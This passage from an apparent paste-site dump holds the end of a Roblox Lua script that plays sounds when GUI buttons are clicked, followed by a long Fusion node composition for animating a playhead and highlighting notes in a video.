		-- Settings (Change)
		local islooped = false -- Change If You Want The Sound To Be Looped Or Not
	
		-- Creating Instance
		local sound = Instance.new(""Sound"")
		sound.Parent = workspace
		sound.Name = ""soundmodule_test""
	
		-- Loading Audio
		sound.SoundId = ""rbxassetid://160432334"" -- Change To Your Audio
	
		-- Applying Settings
		sound.Looped = islooped
	
		-- Starting Audio
		sound:Play()
		sound.Ended:Connect(function()
			sound:Destroy()
		end)
	end)
	
	
end
coroutine.wrap(QQWITL_fake_script)()
local function YYVTA_fake_script() -- Fart.Playsound 
	local script = Instance.new('LocalScript', Fart)

	--[[
	                Info:
	       Created By: Mynamejeff_laptop
	       Published On: 2/17/2024    
	]]
	script.Parent.MouseButton1Click:Connect(function()
		-- Settings (Change)
		local islooped = false -- Change If You Want The Sound To Be Looped Or Not
	
		-- Creating Instance
		local sound = Instance.new(""Sound"")
		sound.Parent = workspace
		sound.Name = ""soundmodule_test""
	
		-- Loading Audio
		sound.SoundId = ""rbxassetid://4809574295"" -- Change To Your Audio
	
		-- Applying Settings
		sound.Looped = islooped
	
		-- Starting Audio
		sound:Play()
		sound.Ended:Connect(function()
			sound:Destroy()
		end)
	end)
	
	
end
coroutine.wrap(YYVTA_fake_script)()
"
Y7F4i7zq,Notes Highlighting 2,marcusa3000,Lua,Sunday 18th of February 2024 01:33:28 PM CDT,"{
	Tools = ordered() {
		Ph_Cleanplate = GroupOperator {
			NameSet = true,
			Inputs = ordered() {
				Input1 = InstanceInput {
					SourceOp = ""Ph_BG_Resize"",
					Source = ""Input"",
				}
			},
			Outputs = {
				Output1 = InstanceOutput {
					SourceOp = ""Upsize_36"",
					Source = ""Output"",
				}
			},
			ViewInfo = GroupInfo {
				Pos = { 2860, 775.5 },
				Flags = {
					AllowPan = false,
					AutoSnap = true
				},
				Size = { 346, 66.3636, 173, 24.2424 },
				Direction = ""Vertical"",
				PipeStyle = ""Direct"",
				Scale = 1,
				Offset = { 0, 0 }
			},
			Tools = ordered() {
				Upsize_36 = BetterResize {
					CtrlWShown = false,
					NameSet = true,
					Inputs = {
						Width = Input {
							Value = 3840,
							Expression = ""NotesBG_Merge.Background.OriginalWidth"",
						},
						Height = Input {
							Value = 720,
							Expression = ""NotesBG_Merge.Background.OriginalHeight"",
						},
						HiQOnly = Input { Value = 0, },
						PixelAspect = Input { Value = { 1, 1 }, },
						FilterMethod = Input { Value = 0, },
						Input = Input {
							SourceOp = ""Ph_CleanPlate"",
							Source = ""Output"",
						},
					},
					ViewInfo = OperatorInfo { Pos = { -110, 8.75757 } },
					Colors = { TileColor = { R = 0.725490196078431, G = 0.690196078431373, B = 0.592156862745098 }, }
				},
				Ph_CleanPlate = CleanPLate {
					CtrlWShown = false,
					NameSet = true,
					Inputs = {
						Method = Input { Value = FuID { ""Ranges"" }, },
						InsideFill = Input { Value = 1, },
						HoldTime = Input { Value = 175, },
						Input = Input {
							SourceOp = ""Ph_BG_Resize"",
							Source = ""Output"",
						},
					},
					ViewInfo = OperatorInfo { Pos = { 0, 8.75757 } },
					Colors = { TileColor = { R = 0.725490196078431, G = 0.690196078431373, B = 0.592156862745098 }, }
				},
				Ph_BG_Resize = BetterResize {
					CtrlWShown = false,
					NameSet = true,
					Inputs = {
						Width = Input {
							Value = 3840,
							Expression = ""NotesBG_Merge.Background.OriginalWidth"",
						},
						Height = Input { Value = 1, },
						HiQOnly = Input { Value = 0, },
						PixelAspect = Input { Value = { 1, 1 }, },
						FilterMethod = Input { Value = 0, },
						Input = Input {
							SourceOp = ""Ph_BG"",
							Source = ""Output"",
						},
					},
					ViewInfo = OperatorInfo { Pos = { 110, 8.75757 } },
					Colors = { TileColor = { R = 0.725490196078431, G = 0.690196078431373, B = 0.592156862745098 }, }
				}
			},
			Colors = { TileColor = { R = 0.725490196078431, G = 0.690196078431373, B = 0.592156862745098 }, }
		},
		Ph_Merge = Merge {
			NameSet = true,
			CustomData = { Settings = {
				} },
			Inputs = {
				EffectMask = Input {
					SourceOp = ""Upsize_36"",
					Source = ""Output"",
				},
				MultiplyByMask = Input { Value = 1, },
				Background = Input {
					SourceOp = ""Ph_BG"",
					Source = ""Output"",
				},
				Foreground = Input {
					SourceOp = ""MaskContrast"",
					Source = ""Output"",
				},
				ApplyMode = Input { Value = FuID { ""Screen"" }, },
				PerformDepthMerge = Input { Value = 0, },
			},
			ViewInfo = OperatorInfo { Pos = { 2750, 676.5 } },
			Colors = { TileColor = { R = 0.584313725490196, G = 0.294117647058824, B = 0.803921568627451 }, }
		},
		MaskDilate1 = ErodeDilate {
			NameSet = true,
			Inputs = {
				Filter = Input { Value = 3, },
				XAmount = Input { Value = 0.0002, },
			},
			ViewInfo = OperatorInfo { Pos = { 2640, 709.5 } },
			Colors = { TileColor = { R = 0.584313725490196, G = 0.294117647058824, B = 0.803921568627451 }, }
		},
		Ph_BG = Background {
			NameSet = true,
			Inputs = {
				EffectMask = Input {
					SourceOp = ""Playhead"",
					Source = ""Mask"",
				},
				GlobalOut = Input { Value = 399, },
				Width = Input {
					Value = 3840,
					Expression = ""NotesBG_Merge.Background.OriginalWidth"",
				},
				Height = Input {
					Value = 720,
					Expression = ""NotesBG_Merge.Background.OriginalHeight"",
				},
				Depth = Input { Value = 1, },
				[""Gamut.SLogVersion""] = Input { Value = FuID { ""SLog2"" }, },
				TopLeftRed = Input { Value = 1, },
				TopLeftGreen = Input { Value = 1, },
				TopLeftBlue = Input { Value = 1, },
				TopRightRed = Input { Value = 1, },
				TopRightGreen = Input { Value = 1, },
				TopRightBlue = Input { Value = 1, },
				BottomLeftRed = Input { Value = 1, },
				BottomLeftGreen = Input { Value = 0.5, },
				BottomRightGreen = Input { Value = 0.5, },
				BottomRightBlue = Input { Value = 1, },
				Start = Input { Value = { 0.5, 0.5 }, },
				Gradient = Input {
					Value = Gradient {
						Colors = {
							[0] = { 1, 1, 1, 1 },
							[1] = { 0, 0, 0, 1 }
						}
					},
				},
				FrameRenderScriptNest = Input { Value = 0, },
			},
			ViewInfo = OperatorInfo { Pos = { 2970, 676.5 } },
			Colors = { TileColor = { R = 0.725490196078431, G = 0.690196078431373, B = 0.592156862745098 }, }
		},
		MaskContrast = BrightnessContrast {
			NameSet = true,
			Inputs = {
				ApplyMaskInverted = Input { Value = 1, },
				Contrast = Input { Value = 0.5, },
				Input = Input {
					SourceOp = ""MaskDilate1"",
					Source = ""Output"",
				},
			},
			ViewInfo = OperatorInfo { Pos = { 2640, 676.5 } },
			Colors = { TileColor = { R = 0.584313725490196, G = 0.294117647058824, B = 0.803921568627451 }, }
		},
		Color = Background {
			NameSet = true,
			Inputs = {
				EffectMask = Input {
					SourceOp = ""Ph_Merge"",
					Source = ""Output"",
				},
				MaskChannel = Input { Value = 5, },
				GlobalOut = Input { Value = 399, },
				Width = Input {
					Value = 3840,
					Expression = ""NotesBG_Merge.Background.OriginalWidth"",
				},
				Height = Input {
					Value = 720,
					Expression = ""NotesBG_Merge.Background.OriginalHeight"",
				},
				Depth = Input { Value = 1, },
				[""Gamut.SLogVersion""] = Input { Value = FuID { ""SLog2"" }, },
				TopLeftRed = Input { Value = 1, },
				TopLeftGreen = Input { Value = 0.5, },
				TopRightRed = Input { Value = 1, },
				TopRightGreen = Input { Value = 1, },
				TopRightBlue = Input { Value = 1, },
				BottomLeftRed = Input { Value = 1, },
				BottomLeftGreen = Input { Value = 0.071, },
				BottomRightGreen = Input { Value = 0.5, },
				BottomRightBlue = Input { Value = 1, },
				Start = Input { Value = { 0.5, 0.5 }, },
				Gradient = Input {
					Value = Gradient {
						Colors = {
							[0] = { 1, 1, 1, 1 },
							[1] = { 0, 0, 0, 1 }
						}
					},
				},
			},
			ViewInfo = OperatorInfo { Pos = { 2750, 445.5 } },
			Colors = { TileColor = { R = 0.92156862745098, G = 0.431372549019608, B = 0 }, }
		},
		Playhead = RectangleMask {
			NameSet = true,
			Inputs = {
				EffectMask = Input {
					SourceOp = ""Ph_Mask"",
					Source = ""Mask"",
				},
				Quality = Input { Value = 3, },
				Filter = Input { Value = FuID { ""Fast Gaussian"" }, },
				PaintMode = Input { Value = FuID { ""Minimum"" }, },
				MaskWidth = Input { Value = 1920, },
				MaskHeight = Input { Value = 316, },
				PixelAspect = Input { Value = { 1, 1 }, },
				UseFrameFormatSettings = Input { Value = 1, },
				ClippingMode = Input { Value = FuID { ""None"" }, },
				Center = Input {
					SourceOp = ""Playhead_Path_1"",
					Source = ""Position"",
				},
				Width = Input {
					Value = 0.00104166666666667,
					Expression = ""1/1920*2"",
				},
				Height = Input { Value = 1, },
			},
			ViewInfo = OperatorInfo { Pos = { 2970, 577.5 } },
			Colors = { TileColor = { R = 0.623529411764706, G = 0.776470588235294, B = 0.0823529411764706 }, }
		},
		Playhead_Path_1 = PolyPath {
			DrawMode = ""InsertAndModify"",
			CtrlWZoom = false,
			NameSet = true,
			Inputs = {
				Displacement = Input {
					SourceOp = ""Playhead_Path_1Displacement"",
					Source = ""Value"",
				},
				PolyLine = Input {
					Value = Polyline {
						Points = {
							{ Linear = true, LockY = true, X = -0.445667, Y = 0, RX = 0.296125111111111, RY = 0 },
							{ Linear = true, LockY = true, X = 0.442708333333333, Y = 0, LX = -0.296125111111111, LY = 0 }
						}
					},
				},
			},
		},
		Playhead_Path_1Displacement = BezierSpline {
			SplineColor = { Red = 255, Green = 0, Blue = 255 },
			CtrlWZoom = false,
			KeyFrames = {
				[15] = { 0, RH = { 138, 0.333333333333333 }, Flags = { LockedY = true } },
				[384] = { 1, LH = { 261, 0.666666666666667 }, Flags = { Linear = true, LockedY = true } }
			}
		},
		Ph_Mask = RectangleMask {
			NameSet = true,
			Inputs = {
				Filter = Input { Value = FuID { ""Fast Gaussian"" }, },
				MaskWidth = Input { Value = 1920, },
				MaskHeight = Input { Value = 316, },
				PixelAspect = Input { Value = { 1, 1 }, },
				UseFrameFormatSettings = Input { Value = 1, },
				ClippingMode = Input { Value = FuID { ""None"" }, },
				Width = Input { Value = 0.884375, },
				Height = Input { Value = 2, },
			},
			ViewInfo = OperatorInfo { Pos = { 2970, 445.5 } },
			Colors = { TileColor = { R = 0, G = 0.596078431372549, B = 0.6 }, }
		},
		Connect_Note_Merges_to_this = Underlay {
			NameSet = true,
			ViewInfo = UnderlayInfo {
				Pos = { 2706.05, 641.354 },
				Size = { 278.715, 116.772 }
			},
			Colors = { TileColor = { R = 0.584313725490196, G = 0.294117647058824, B = 0.803921568627451 }, }
		},
		Animate_Playhead = Underlay {
			NameSet = true,
			ViewInfo = UnderlayInfo {
				Pos = { 2968.42, 549.293 },
				Size = { 135.891, 86 }
			},
			Colors = { TileColor = { R = 0.623529411764706, G = 0.776470588235294, B = 0.0823529411764706 }, }
		},
		Magic_v7b = GroupOperator {
			NameSet = true,
			Inputs = ordered() {
				Input1 = InstanceInput {
					SourceOp = ""ChangeDepthNote"",
					Source = ""Input"",
				}
			},
			Outputs = {
				Output1 = InstanceOutput {
					SourceOp = ""PipeRouter13_2"",
					Source = ""Output"",
				}
			},
			ViewInfo = GroupInfo {
				Pos = { 2420, 841.5 },
				Flags = {
					AllowPan = false,
					GridSnap = true,
					AutoSnap = true
				},
				Size = { 1141.56, 555.945, 620.282, 73.2472 },
				Direction = ""Vertical"",
				PipeStyle = ""Direct"",
				Scale = 1,
				Offset = { 0, 0 }
			},
			Tools = ordered() {
				PipeRouter13_2 = PipeRouter {
					CtrlWShown = false,
					Inputs = {
						Input = Input {
							SourceOp = ""RG_or_B"",
							Source = ""Output"",
						},
					},
					ViewInfo = PipeRouterInfo { Pos = { 0, 346.5 } },
				},
				ColorCheck = GroupOperator {
					CtrlWShown = false,
					NameSet = true,
					Inputs = ordered() {
						Input1 = InstanceInput {
							SourceOp = ""PipeRouter9_4"",
							Source = ""Input"",
						}
					},
					ViewInfo = GroupInfo {
						Pos = { -165, 115.5 },
						Flags = {
							AllowPan = false,
							GridSnap = true,
							ConnectedSnap = true,
							AutoSnap = true,
							ShowInstance = false,
							RemoveRouters = true
						},
						Size = { 233.957, 221.003, 112.533, 40.4071 },
						Direction = ""Vertical"",
						PipeStyle = ""Direct"",
						Scale = 1,
						Offset = { 991.66, 980.621 }
					},
					Tools = ordered() {
						PipeRouter9_4 = PipeRouter {
							CtrlWShown = false,
							Inputs = {
								Input = Input {
									SourceOp = ""ChangeDepthNote"",
									Source = ""Output"",
								},
							},
							ViewInfo = PipeRouterInfo { Pos = { -990, -973.5 } },
						},
						Bitmap1_26 = BitmapMask {
							CtrlWShown = false,
							Inputs = {
								Filter = Input { Value = FuID { ""Fast Gaussian"" }, },
								MaskWidth = Input { Value = 1920, },
								MaskHeight = Input { Value = 316, },
								PixelAspect = Input { Value = { 1, 1 }, },
								UseFrameFormatSettings = Input { Value = 1, },
								ClippingMode = Input { Value = FuID { ""None"" }, },
								Image = Input {
									SourceOp = ""PipeRouter9_4"",
									Source = ""Output"",
								},
								Channel = Input { Value = FuID { ""Red"" }, },
							},
							ViewInfo = OperatorInfo { Pos = { -1045, -907.5 } },
							Colors = { TileColor = { R = 0.913725490196078, G = 0.549019607843137, B = 0.709803921568627 }, }
						},
						Bitmap1_25 = BitmapMask {
							CtrlWShown = false,
							Inputs = {
								Filter = Input { Value = FuID { ""Fast Gaussian"" }, },
								MaskWidth = Input { Value = 1920, },
								MaskHeight = Input { Value = 316, },
								PixelAspect = Input { Value = { 1, 1 }, },
								UseFrameFormatSettings = Input { Value = 1, },
								ClippingMode = Input { Value = FuID { ""None"" }, },
								Image = Input {
									SourceOp = ""PipeRouter9_4"",
									Source = ""Output"",
								},
								Channel = Input { Value = FuID { ""Green"" }, },
							},
							ViewInfo = OperatorInfo { Pos = { -935, -907.5 } },
							Colors = { TileColor = { R = 0.266666666666667, G = 0.56078431372549, B = 0.396078431372549 }, }
						},
						AD_R_6 = AutoDomain {
							CtrlWShown = false,
							NameSet = true,
							Inputs = {
								Input = Input {
									SourceOp = ""Bitmap1_26"",
									Source = ""Mask"",
								},
							},
							ViewInfo = OperatorInfo { Pos = { -1045, -841.5 } },
							Colors = { TileColor = { R = 0.913725490196078, G = 0.549019607843137, B = 0.709803921568627 }, }
						},
						AD_G_6 = AutoDomain {
							CtrlWShown = false,
							NameSet = true,
							Inputs = {
								Input = Input {
									SourceOp = ""Bitmap1_25"",
									Source = ""Mask"",
								},
							},
							ViewInfo = OperatorInfo { Pos = { -935, -841.5 } },
							Colors = { TileColor = { R = 0.266666666666667, G = 0.56078431372549, B = 0.396078431372549 }, }
						}
					},
				},
				RG_or_B = Dissolve {
					Transitions = {
						[0] = ""DFTDissolve""
					},
					CtrlWShown = false,
					NameSet = true,
					Inputs = {
						Mix = Input { Expression = "":\nR=AD_R_6.Output.DataWindow[3]-AD_R_6.Output.DataWindow[1];\nG=AD_G_6.Output.DataWindow[3]-AD_G_6.Output.DataWindow[1];\nreturn\nR==G and 0 or 1"", },
						Background = Input {
							SourceOp = ""Prev_Note_OFF_Rest"",
							Source = ""Output"",
						},
						Foreground = Input {
							SourceOp = ""R_or_G"",
							Source = ""Output"",
						},
					},
					ViewInfo = OperatorInfo { Pos = { 0, 280.5 } },
				},
				R_or_G = Dissolve {
					Transitions = {
						[0] = ""DFTDissolve""
					},
					CtrlWShown = false,
					NameSet = true,
					Inputs = {
						Mix = Input { Expression = "":\nR=AD_R_6.Output.DataWindow[3]-AD_R_6.Output.DataWindow[1];\nG=AD_G_6.Output.DataWindow[3]-AD_G_6.Output.DataWindow[1];\nreturn\nR<=G and 0 or 1"", },
						Background = Input {
							SourceOp = ""Prev_Note_OFF_MM"",
							Source = ""Output"",
						},
						Foreground = Input {
							SourceOp = ""Prev_Note_OFF_Nrml"",
							Source = ""Output"",
						},
					},
					ViewInfo = OperatorInfo { Pos = { 110, 214.5 } },
				},
				ChangeDepthNote = ChangeDepth {
					CtrlWShown = false,
					NameSet = true,
					Inputs = {
						Depth = Input { Value = 1, },
					},
					ViewInfo = OperatorInfo { Pos = { 0, -16.5 } },
				},
				NormalNote = GroupOperator {
					CtrlWShown = false,
					NameSet = true,
					Inputs = ordered() {
						Input1 = InstanceInput {
							SourceOp = ""PipeRouter7_6"",
							Source = ""Input"",
						}
					},
					Outputs = {
						Output1 = InstanceOutput {
							SourceOp = ""Prev_Note_OFF_Nrml"",
							Source = ""Output"",
						}
					},
					ViewInfo = GroupInfo {
						Pos = { 0, 115.5 },
						Flags = {
							AllowPan = false,
							GridSnap = true,
							AutoSnap = true
						},
						Size = { 806.735, 346.952, 347.5, 139.83 },
						Direction = ""Vertical"",
						PipeStyle = ""Direct"",
						Scale = 1,
						Offset = { -45.5, -271.864 }
					},
					Tools = ordered() {
						PipeRouter7_6 = PipeRouter {
							CtrlWShown = false,
							Inputs = {
								Input = Input {
									SourceOp = ""ChangeDepthNote"",
									Source = ""Output"",
								},
							},
							ViewInfo = PipeRouterInfo { Pos = { -275, 280.5 } },
						},
						Note_CleanPlate_Nrml = CleanPLate {
							CtrlWShown = false,
							NameSet = true,
							Inputs = {
								Method = Input { Value = FuID { ""Ranges"" }, },
								InsideFill = Input { Value = 1, },
								HoldTime = Input { Value = 35, },
								Input = Input {
									SourceOp = ""Downsize_Nrml"",
									Source = ""Output"",
								},
							},
							ViewInfo = OperatorInfo { Pos = { 55, 379.5 } },
							Colors = { TileColor = { R = 0.474509803921569, G = 0.658823529411765, B = 0.815686274509804 }, }
						},
						Upsize_Nrml = BetterResize {
							CtrlWShown = false,
							NameSet = true,
							Inputs = {
								Width = Input {
									Value = 3840,
									Expression = ""NoteArea_Nrml.Output.OriginalWidth"",
								},
								Height = Input {
									Value = 720,
									Expression = ""NoteArea_Nrml.Output.OriginalHeight"",
								},
								HiQOnly = Input { Value = 0, },
								PixelAspect = Input { Value = { 1, 1 }, },
								FilterMethod = Input { Value = 0, },
								Input = Input {
									SourceOp = ""Note_CleanPlate_Nrml"",
									Source = ""Output"",
								},
							},
							ViewInfo = OperatorInfo { Pos = { 55, 346.5 } },
							Colors = { TileColor = { R = 0.474509803921569, G = 0.658823529411765, B = 0.815686274509804 }, }
						},
						Clear_BG_Nrml = MatteControl {
							CtrlWShown = false,
							NameSet = true,
							Inputs = {
								MatteCombine = Input { Value = 6, },
								Filter = Input { Value = FuID { ""Fast Gaussian"" }, },
								LowMatteThreshold = Input { Value = 0.2, },
								[""Garbage.MaskNest""] = Input { Value = 1, },
								[""Garbage.MaskInverted""] = Input { Value = 1, },
								PostMultiplyImage = Input { Value = 1, },
								Background = Input {
									SourceOp = ""PipeRouter7_6"",
									Source = ""Output"",
								},
							},
							ViewInfo = OperatorInfo { Pos = { -165, 346.5 } },
							Colors = { TileColor = { R = 0.623529411764706, G = 0.776470588235294, B = 0.0823529411764706 }, }
						},
						NoteMask_Nrml = RectangleMask {
							CtrlWShown = false,
							NameSet = true,
							CurrentSettings = 2,
							CustomData = { Settings = { [1] = { Tools = ordered() { NoteMask_54 = RectangleMask { Inputs = { MaskWidth = Input { Value = 1920 }, OutputSize = Input { Value = FuID { ""Custom"" } }, MaskHeight = Input { Value = 316 }, ClippingMode = Input { Value = FuID { ""None"" } }, Center = Input { Value = { 0.353345134122288, 0.5 }, Expression = ""Point(Playhead.Center.X-0.5, 0.5)"" }, Filter = Input { Value = FuID { ""Fast Gaussian"" } }, Height = Input { Value = 1 }, PixelAspect = Input { Value = { 1, 1 } }, UseFrameFormatSettings = Input { Value = 1 }, Width = Input { Value = 1 } }, Colors = { TileColor = { R = 0.623529411764706, G = 0.776470588235294, B = 0.0823529411764706 } }, CtrlWZoom = false, NameSet = true, ViewInfo = OperatorInfo { Pos = { -220, 181.5 } }, CustomData = {
												} } } } } },
							Inputs = {
								Filter = Input { Value = FuID { ""Fast Gaussian"" }, },
								OutputSize = Input { Value = FuID { ""Custom"" }, },
								MaskWidth = Input {
									Value = 3840,
									Expression = ""ChangeDepthNote.Output.OriginalWidth"",
								},
								MaskHeight = Input {
									Value = 720,
									Expression = ""ChangeDepthNote.Output.OriginalHeight"",
								},
								PixelAspect = Input { Value = { 1, 1 }, },
								ClippingMode = Input { Value = FuID { ""None"" }, },
								Center = Input {
									Value = { -0.340533824457594, 0.5 },
									Expression = ""Point(Playhead.Center.X-0.5, 0.5)"",
								},
								Width = Input { Value = 1, },
								Height = Input { Value = 1, },
							},
							ViewInfo = OperatorInfo { Pos = { -220, 412.5 } },
							Colors = { TileColor = { R = 0.623529411764706, G = 0.776470588235294, B = 0.0823529411764706 }, }
						},
						Downsize_Nrml = BetterResize {
							CtrlWShown = false,
							NameSet = true,
							Inputs = {
								Width = Input {
									Value = 960,
									Expression = ""NoteArea_Nrml.Output.OriginalWidth/4"",
								},
								Height = Input { Value = 1, },
								HiQOnly = Input { Value = 0, },
								PixelAspect = Input { Value = { 1, 1 }, },
								FilterMethod = Input { Value = 0, },
								Input = Input {
									SourceOp = ""NoteArea_Nrml"",
									Source = ""Output"",
								},
							},
							ViewInfo = OperatorInfo { Pos = { 55, 412.5 } },
							Colors = { TileColor = { R = 0.474509803921569, G = 0.658823529411765, B = 0.815686274509804 }, }
						},
						NoteBG_Nrml = Background {
							CtrlWShown = false,
							NameSet = true,
							CustomData = { Settings = {
								} },
							Inputs = {
								GlobalOut = Input { Value = 399, },
								Width = Input {
									Value = 42,
									Expression = ""AutoDomain_Nrml.Output.DataWindow[3]-AutoDomain_Nrml.Output.DataWindow[1]"",
								},
								Height = Input {
									Value = 720,
									Expression = ""Clear_BG_Nrml.Output.OriginalHeight"",
								},
								Depth = Input { Value = 1, },
								[""Gamut.SLogVersion""] = Input { Value = FuID { ""SLog2"" }, },
								TopLeftRed = Input { Value = 1, },
								TopLeftGreen = Input { Value = 1, },
								TopLeftBlue = Input { Value = 1, },
								TopRightRed = Input { Value = 1, },
								TopRightGreen = Input { Value = 1, },
								TopRightBlue = Input { Value = 1, },
								BottomLeftRed = Input { Value = 1, },
								BottomLeftGreen = Input { Value = 0.5, },
								BottomRightGreen = Input { Value = 0.5, },
								BottomRightBlue = Input { Value = 1, },
								Start = Input { Value = { 0.5, 0.5 }, },
								Gradient = Input {
									Value = Gradient {
										Colors = {
											[0] = { 1, 1, 1, 1 },
											[1] = { 0, 0, 0, 1 }
										}
									},
								},
							},
							ViewInfo = OperatorInfo { Pos = { -110, 445.5 } },
							Colors = { TileColor = { R = 0.623529411764706, G = 0.776470588235294, B = 0.0823529411764706 }, }
						},
						NoteArea_Nrml = Merge {
							CtrlWShown = false,
							NameSet = true,
							CurrentSettings = 2,
							CustomData = { Settings = { [1] = { Tools = ordered() { NoteArea_54 = Merge { Inputs = { Foreground = Input { SourceOp = ""NoteBG_54"", Source = ""Output"" }, ReferenceSize = Input { Value = 1 }, Center = Input { Value = { 1.63463541666667, 0.5 }, Expression = ""Point((1/self.Width) * (AutoDomain_54.Output.DataWindow[3] - (NoteBG_54.Output.Width/2)), 0.5)"" }, EffectMask = Input { SourceOp = ""NoteMask_54"", Source = ""Mask"" }, Height = Input { Value = 316 }, Background = Input { SourceOp = ""Clear_BG_54"", Source = ""Output"" }, PerformDepthMerge = Input { Value = 0 }, Width = Input { Value = 1920 } }, Colors = { TileColor = { R = 0.623529411764706, G = 0.776470588235294, B = 0.0823529411764706 } }, CtrlWZoom = false, NameSet = true, ViewInfo = OperatorInfo { Pos = { -110, 181.5 } }, CustomData = {
												} } } } } },
							Inputs = {
								EffectMask = Input {
									SourceOp = ""NoteMask_Nrml"",
									Source = ""Mask"",
								},
								Background = Input {
									SourceOp = ""Clear_BG_Nrml"",
									Source = ""Output"",
								},
								Foreground = Input {
									SourceOp = ""NoteBG_Nrml"",
									Source = ""Output"",
								},
								Center = Input {
									Value = { 0.10625, 0.5 },
									Expression = ""Point((1/self.Width) * (AutoDomain_Nrml.Output.DataWindow[3] - (NoteBG_Nrml.Output.Width/2))/2, 0.5)"",
								},
								PerformDepthMerge = Input { Value = 0, },
								ReferenceSize = Input { Value = 1, },
								Width = Input { Value = 1920, },
								Height = Input { Value = 316, },
							},
							ViewInfo = OperatorInfo { Pos = { -110, 412.5 } },
							Colors = { TileColor = { R = 0.623529411764706, G = 0.776470588235294, B = 0.0823529411764706 }, }
						},
						Note_Invert_Nrml = ChannelBoolean {
							CtrlWShown = false,
							NameSet = true,
							Inputs = {
								ToRed = Input { Value = 15, },
								ToGreen = Input { Value = 15, },
								ToBlue = Input { Value = 15, },
								Background = Input {
									SourceOp = ""Upsize_Nrml"",
									Source = ""Output"",
								},
							},
							ViewInfo = OperatorInfo { Pos = { 220, 346.5 } },
							Colors = { TileColor = { R = 0.474509803921569, G = 0.658823529411765, B = 0.815686274509804 }, }
						},
						Prev_Note_OFF_Nrml = Merge {
							CtrlWShown = false,
							NameSet = true,
							Inputs = {
								Background = Input {
									SourceOp = ""Note_Invert_Nrml"",
									Source = ""Output"",
								},
								Foreground = Input {
									SourceOp = ""This_Note_ON_Nrml"",
									Source = ""Output"",
								},
								PerformDepthMerge = Input { Value = 0, },
							},
							ViewInfo = OperatorInfo { Pos = { 330, 280.5 } },
							Colors = { TileColor = { R = 0.725490196078431, G = 0.690196078431373, B = 0.592156862745098 }, }
						},
						This_Note_ON_Nrml = MatteControl {
							CtrlWShown = false,
							NameSet = true,
							Inputs = {
								EffectMask = Input {
									SourceOp = ""PipeRouter7_6"",
									Source = ""Output"",
								},
								MultiplyByMask = Input { Value = 1, },
								MatteCombine = Input { Value = 4, },
								CombineOp = Input { Value = 5, },
								Filter = Input { Value = FuID { ""Fast Gaussian"" }, },
								MatteBlur = Input { Value = 0.2, },
								MatteContractExpand = Input { Value = 0.46, },
								LowMatteThreshold = Input { Value = 0.05, },
								[""Garbage.MaskNest""] = Input { Value = 1, },
								[""Garbage.MaskInverted""] = Input { Value = 1, },
								PostMultiplyImage = Input { Value = 1, },
								Background = Input {
									SourceOp = ""Upsize_Nrml"",
									Source = ""Output"",
								},
								Foreground = Input {
									SourceOp = ""PipeRouter7_6"",
									Source = ""Output"",
								},
							},
							ViewInfo = OperatorInfo { Pos = { 165, 280.5 } },
							Colors = { TileColor = { R = 0.725490196078431, G = 0.690196078431373, B = 0.592156862745098 }, }
						},
						NoteCleanup_Nrml = GroupOperator {
							CtrlWShown = false,
							NameSet = true,
							Inputs = ordered() {
								Input1 = InstanceInput {
									SourceOp = ""PipeRouter6_4"",
									Source = ""Input"",
								}
							},
							Outputs = {
								Output1 = InstanceOutput {
									SourceOp = ""AutoDomain_Nrml"",
									Source = ""Output"",
								}
							},
							ViewInfo = GroupInfo {
								Pos = { 165, 214.5 },
								Flags = {
									AllowPan = false,
									GridSnap = true,
									AutoSnap = true
								},
								Size = { 660.055, 122.259, 320, 60.5033 },
								Direction = ""Vertical"",
								PipeStyle = ""Direct"",
								Scale = 1,
								Offset = { -18, -108.341 }
							},
							Tools = ordered() {
								PipeRouter6_4 = PipeRouter {
									CtrlWShown = false,
									Inputs = {
										Input = Input {
											SourceOp = ""PipeRouter7_6"",
											Source = ""Output"",
										},
									},
									ViewInfo = PipeRouterInfo { Pos = { -275, 148.5 } },
								},
								Bitmap_Nrml = BitmapMask {
									CtrlWShown = false,
									NameSet = true,
									Inputs = {
										Filter = Input { Value = FuID { ""Fast Gaussian"" }, },
										MaskWidth = Input { Value = 1920, },
										MaskHeight = Input { Value = 316, },
										PixelAspect = Input { Value = { 1, 1 }, },
										UseFrameFormatSettings = Input { Value = 1, },
										ClippingMode = Input { Value = FuID { ""None"" }, },
										Image = Input {
											SourceOp = ""Wand_Nrml"",
											Source = ""Mask"",
										},
										Channel = Input { Value = FuID { ""Luminance"" }, },
										Low = Input { Value = 0.5, },
										High = Input { Value = 0.5, },
									},
									ViewInfo = OperatorInfo { Pos = { 55, 115.5 } },
								},
								CleanPlate_Nrml = CleanPLate {
									CtrlWShown = false,
									NameSet = true,
									Inputs = {
										EffectMask = Input {
											SourceOp = ""Wand_Nrml"",
											Source = ""Mask"",
										},
										ApplyMaskInverted = Input { Value = 1, },
										MultiplyByMask = Input { Value = 1, },
										Method = Input { Value = FuID { ""Ranges"" }, },
										GrowEdges = Input { Value = 0.2, },
										InsideFill = Input { Value = 1, },
										HoldTime = Input { Value = 35, },
										[""Garbage.MaskNest""] = Input { Value = 1, },
										Input = Input {
											SourceOp = ""PipeRouter6_4"",
											Source = ""Output"",
										},
									},
									ViewInfo = OperatorInfo { Pos = { -165, 148.5 } },
								},
								Dilate_Nrml = ErodeDilate {
									CtrlWShown = false,
									NameSet = true,
									CurrentSettings = 2,
									CustomData = { Settings = { [1] = { Tools = ordered() { Dilate_108 = ErodeDilate { Inputs = { Input = Input { SourceOp = ""Erode_108"", Source = ""Output"" }, XAmount = Input { Value = 0.0026 }, Filter = Input { Value = 3 } }, Colors = { TileColor = { R = 0.92156862745098, G = 0.431372549019608, B = 0 } }, CtrlWZoom = false, NameSet = true, ViewInfo = OperatorInfo { Pos = { -55, 9.51468 } }, CustomData = {
														} } } } } },
									Inputs = {
										Filter = Input { Value = 3, },
										XAmount = Input { Value = 0.00444, },
										Input = Input {
											SourceOp = ""Erode_Nrml"",
											Source = ""Output"",
										},
									},
									ViewInfo = OperatorInfo { Pos = { 55, 148.5 } },
									Colors = { TileColor = { R = 0.92156862745098, G = 0.431372549019608, B = 0 }, }
								},
								AutoDomain_Nrml = AutoDomain {
									CtrlWShown = false,
									NameSet = true,
									Inputs = {
										Input = Input {
											SourceOp = ""MatteCrunch_Nrml"",
											Source = ""Output"",
										},
									},
									ViewInfo = OperatorInfo { Pos = { 275, 148.5 } },
									Colors = { TileColor = { R = 0.92156862745098, G = 0.431372549019608, B = 0 }, }
								},
								MatteCrunch_Nrml = MatteControl {
									CtrlWShown = false,
									NameSet = true,
									CurrentSettings = 2,
